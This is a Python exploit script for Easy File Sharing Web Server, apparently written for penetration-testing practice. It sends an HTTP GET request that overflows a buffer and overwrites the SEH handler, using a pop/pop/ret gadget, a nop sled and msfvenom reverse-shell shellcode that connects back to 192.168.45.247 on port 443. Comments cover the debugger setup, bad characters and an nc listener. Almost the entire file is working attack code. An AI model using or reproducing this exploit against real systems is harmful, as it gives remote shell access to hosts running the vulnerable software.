#!/usr/bin/python3

from struct import pack
import pwn
import socket
import sys


def main() :
    server = sys.argv[1]
    payload = buildPayload()
    sendPayload(server, payload)


def buildPayload():
    # Attach windbg to fsws.exe (no service, doesn't start automatically => restart manually after each crash)

    # 0:008> !nmod
    # 00400000 005c2000 fsws                 /SafeSEH OFF                C:\EFS Software\Easy File Sharing Web Server\fsws.exe
    # 016e0000 01725000 SSLEAY32             /SafeSEH ON  /GS            C:\EFS Software\Easy File Sharing Web Server\SSLEAY32.dll
    # 01730000 01847000 LIBEAY32             /SafeSEH OFF                C:\EFS Software\Easy File Sharing Web Server\LIBEAY32.dll
    # 10000000 10050000 ImageLoad            /SafeSEH OFF                C:\EFS Software\Easy File Sharing Web Server\ImageLoad.dll
    # 61c00000 61c99000 sqlite3              /SafeSEH OFF                C:\EFS Software\Easy File Sharing Web Server\sqlite3.dll

    # note that of these only sqlite3 is stable; the addresses of other modules vary
    # => this exploits needs to be run multiple times until it works ...

    payloadSize = 0x5000
    badchars = b"\x00\x0a\x0d\x20\x25\x2f\x5c"
    # buf += bytes([ b for b in range(0x100)
    #                  if b not in badchars])

    buf  = b""

    # buf += pwn.cyclic(payloadSize)
    offBufSeh = 0xfe1                                           # pwn.cyclic_find(0x6261726f)

    buf += b"A" * (offBufSeh - len(buf) - 4)
    
    buf += b"\xeb\x06\x90\x90"                                  # short jump over NSEH
    buf += pack("<I", 0x1001b011)                               # SEH pop/pop/ret
    # buf += pack("<I", 0x61c7249e)                             # int3 (debug gadget)

    buf += b"\x90" * 0x10                                       # nopsled
    
    # shellcode
    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.247 LPORT=443 -f python -b "\x00\x0a\x0d\x20\x25\x2f\x5c"
    # note that both encoders x86/call4_dword_xor and x86/xor_dynamic failed; x86/shikata_ga_nai worked on the first try
    # nc -vlnp 443
    buf += b"\xbf\x6d\xf1\xbd\xe7\xd9\xcc\xd9\x74\x24\xf4\x5b"
    buf += b"\x31\xc9\xb1\x52\x31\x7b\x12\x83\xeb\xfc\x03\x16"
    buf += b"\xff\x5f\x12\x14\x17\x1d\xdd\xe4\xe8\x42\x57\x01"
    buf += b"\xd9\x42\x03\x42\x4a\x73\x47\x06\x67\xf8\x05\xb2"
    buf += b"\xfc\x8c\x81\xb5\xb5\x3b\xf4\xf8\x46\x17\xc4\x9b"
    buf += b"\xc4\x6a\x19\x7b\xf4\xa4\x6c\x7a\x31\xd8\x9d\x2e"
    buf += b"\xea\x96\x30\xde\x9f\xe3\x88\x55\xd3\xe2\x88\x8a"
    buf += b"\xa4\x05\xb8\x1d\xbe\x5f\x1a\x9c\x13\xd4\x13\x86"
    buf += b"\x70\xd1\xea\x3d\x42\xad\xec\x97\x9a\x4e\x42\xd6"
    buf += b"\x12\xbd\x9a\x1f\x94\x5e\xe9\x69\xe6\xe3\xea\xae"
    buf += b"\x94\x3f\x7e\x34\x3e\xcb\xd8\x90\xbe\x18\xbe\x53"
    buf += b"\xcc\xd5\xb4\x3b\xd1\xe8\x19\x30\xed\x61\x9c\x96"
    buf += b"\x67\x31\xbb\x32\x23\xe1\xa2\x63\x89\x44\xda\x73"
    buf += b"\x72\x38\x7e\xf8\x9f\x2d\xf3\xa3\xf7\x82\x3e\x5b"
    buf += b"\x08\x8d\x49\x28\x3a\x12\xe2\xa6\x76\xdb\x2c\x31"
    buf += b"\x78\xf6\x89\xad\x87\xf9\xe9\xe4\x43\xad\xb9\x9e"
    buf += b"\x62\xce\x51\x5e\x8a\x1b\xf5\x0e\x24\xf4\xb6\xfe"
    buf += b"\x84\xa4\x5e\x14\x0b\x9a\x7f\x17\xc1\xb3\xea\xe2"
    buf += b"\x82\x7b\x42\xc1\xa5\x14\x91\x19\x4b\x5e\x1c\xff"
    buf += b"\x21\xb0\x49\xa8\xdd\x29\xd0\x22\x7f\xb5\xce\x4f"
    buf += b"\xbf\x3d\xfd\xb0\x0e\xb6\x88\xa2\xe7\x36\xc7\x98"
    buf += b"\xae\x49\xfd\xb4\x2d\xdb\x9a\x44\x3b\xc0\x34\x13"
    buf += b"\x6c\x36\x4d\xf1\x80\x61\xe7\xe7\x58\xf7\xc0\xa3"
    buf += b"\x86\xc4\xcf\x2a\x4a\x70\xf4\x3c\x92\x79\xb0\x68"
    buf += b"\x4a\x2c\x6e\xc6\x2c\x86\xc0\xb0\xe6\x75\x8b\x54"
    buf += b"\x7e\xb6\x0c\x22\x7f\x93\xfa\xca\xce\x4a\xbb\xf5"
    buf += b"\xff\x1a\x4b\x8e\x1d\xbb\xb4\x45\xa6\xcb\xfe\xc7"
    buf += b"\x8f\x43\xa7\x92\x8d\x09\x58\x49\xd1\x37\xdb\x7b"
    buf += b"\xaa\xc3\xc3\x0e\xaf\x88\x43\xe3\xdd\x81\x21\x03"
    buf += b"\x71\xa1\x63"

    buf += b"Z" * (payloadSize - len(buf))                      # padding to reach fixed size

    # some sanity checks
    assert len(buf) == payloadSize, "Mismatching size: f{len(buf)} != f{payloadSize}"
    for b in badchars:
        assert b not in buf, print(f"Error: badchar {hex(b)} ('{chr(b)}') appeared in payload", "\n\n", pwn.hexdump(buf))

    return buf


def sendPayload(server, payload):
    buf = b"GET " + payload + b" HTTP/1.1\r\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, 80))
    s.send(buf)
    s.close()


if __name__ == "__main__":
    main()
